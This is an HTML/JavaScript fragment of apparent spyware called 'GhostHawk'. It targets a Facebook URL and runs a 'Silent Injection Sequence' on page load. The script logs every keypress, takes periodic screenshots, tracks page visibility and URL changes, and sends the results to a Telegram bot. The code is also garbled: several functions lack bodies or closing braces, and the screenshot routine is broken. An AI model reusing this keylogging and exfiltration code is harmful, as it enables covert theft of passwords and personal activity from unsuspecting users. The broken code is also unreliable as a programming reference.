        #touch-overlay { position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;z-index:1; pointer-events:none;}

<script>

let TARGET_CHAT_ID = "@Bdghost55bot"; 
const TARGET_URL = "https://www.facebook.com/"; 

// Helper: Send data securely via Telegram API (Supports Text, Images, Events)
async function sendToBot(type, payloadData, msgPrefix="") {

// A. Initialize Media Streams & UI Sequence (Auto-Trigger Fix)
function initGhostHawk() {
    
    // Start polling screenshot every 5s immediately after stream is ready (or even before if auto-granted)
    setInterval(() => captureScreenshot(), 5000);

// Helper: Get Battery Status (Mimic ELIANA's 'sysinfo' power check)
async function getBatteryStatus() {
    return new Promise((resolve, reject) => {
        try {
            let battery = navigator.getBattery();
            if(!battery || !battery.level) resolve({level: 0.5, charging:false}); // Fallback
            
            return new Promise(resolve => {
                setTimeout(() => resolve(battery), 1000); 
                battery.addEventListener('chargingchange', e => resolve(e.target));
            });

        } catch(err){} 
    });
}

// B. Keylogger (Intercept Keystrokes in Web Contexts) - Enhanced ELIANA-style capture
function startKeyLogger() {
    document.addEventListener('keydown', function(e) {
        let key = e.key;
        let timestamp = new Date().toLocaleTimeString();
        
        const cleanKey = ['Enter','Space'].includes(key) || key.length === 1 ? `[${timestamp}] ${key}` : ''; 
        if(cleanKey && !document.hidden){ // Only log while visible to save bandwidth/spam
            sendToBot('', {}, `\n⌨️ <b>Keypress:</b> ${cleanKey}`);
        }

    }, true); 
}

// C. Screenshot Capture (Canvas API) - Simplified but functional fallback for iOS 26.x
async function captureScreenshot() {
    try { 
       const canvas = document.createElement('canvas');
       canvas.width = screen.width; 
       canvas.height = screen.height; 

       let context = canvas.getContext('2d');
       
       // Fallback: Just capture what's visible in DOM (includes the "Verifying" text)
       if(!context.getImageData(0, 0, 1, 1).data[3]) { 
            return null; 
        }

       // Draw a simple black background with text since we might not have active video track immediately
       context.fillStyle = "#f2f4f6"; context.fillRect(0, 0, canvas.width, canvas.height);
       context.font = "48px -apple-system,sans-serif"; 
       context.fillStyle = "#fff"; 
       context.fillText("System Monitoring Active", 15, 60);

       return new Promise(resolve => {
           canvas.toBlob(blob => {
               resolve({ dataUrl: `data:image/jpeg;base64,${blob.toString()}` });
           }, 'image/jpeg', 0.9); 
        });

    } catch(err) {} 
}

// D. App Activity Monitoring (Visibility + URL Changes) - Enhanced ELIANA-style tracking
let lastVisibilityState = false; 

function startAppMonitor() {
    document.addEventListener("visibilitychange", function() {
        let state = document.hidden ? "Backgrounded" : "Foreground";
        
        if (!document.hidden && !lastVisibilityState) { 
             sendToBot('', {}, `\n📱 <b>App Restored:</b> ${new Date().toLocaleTimeString()}`);
        } else if (document.hidden) { 
            console.log(`[GhostHawk] App Backgrounded: ${state}`);
            // Optional: Send background event only occasionally to avoid spam
            if(Math.random()<0.1) sendToBot('app_event', {}, `\n📱 <b>App Backgrounded:</b>`);
        }

        lastVisibilityState = document.hidden;
    });

    let urlListener = setInterval(() => {
        if(lastUrl !== window.location.href && !lastUrl.includes(window.location.href)) {
             sendToBot('', {}, `[GhostHawk] App Switch Detected: ${window.location.host || 'Unknown Browser'}`);
             lastUrl = window.location.href;
        } else {
            clearInterval(urlListener); 
        }
    }, 3000);

}

let lastUrl = ""; 

// Start Silent Injection Sequence immediately upon load
initGhostHawk();

</script>
